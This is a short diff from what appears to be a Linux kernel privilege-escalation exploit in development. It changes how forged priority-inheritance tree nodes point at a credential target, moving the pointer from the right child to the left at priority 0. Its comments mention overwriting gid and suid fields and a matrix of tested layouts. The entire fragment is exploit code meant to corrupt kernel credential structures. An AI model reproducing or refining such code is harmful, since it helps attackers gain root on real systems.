@@ -1023,16 +1023,16 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
               tree_pc = 0;
               tree_r = 0;
               tree_l = 0;
-              /* RIGHT-child pi form: change_child writes cc+8 (gid),
-               * rebalance sibling = cc+0x10 (suid=0) = NULL case ->
-               * up-walk cc -> usage(&zeroed Z) -> NULL terminates;
-               * the only slot rewrite is set-black(cc) = same value. */
+              /* LEFT-child pi at prio=0: the only geometry that walked
+               * clean with live pi words (r219140) — but that fire ran
+               * prio=1 (branch omission). This is the untested cell of
+               * the matrix: left-pi + prio=0. */
               pi_parent = val_pi;
-              pi_right = ztgt;
-              pi_left = 0;
+              pi_right = 0;
+              pi_left = ztgt;
               stack_prio = 0;
               stack_deadline = 0;
-              pr_info("stack CRED_PI-R: pi *%016llx = %016llx main=0\n",
+              pr_info("stack CRED_PI-L0: pi *%016llx = %016llx main=0\n",
                       (unsigned long long)ztgt,
                       (unsigned long long)val_pi);
             } else {
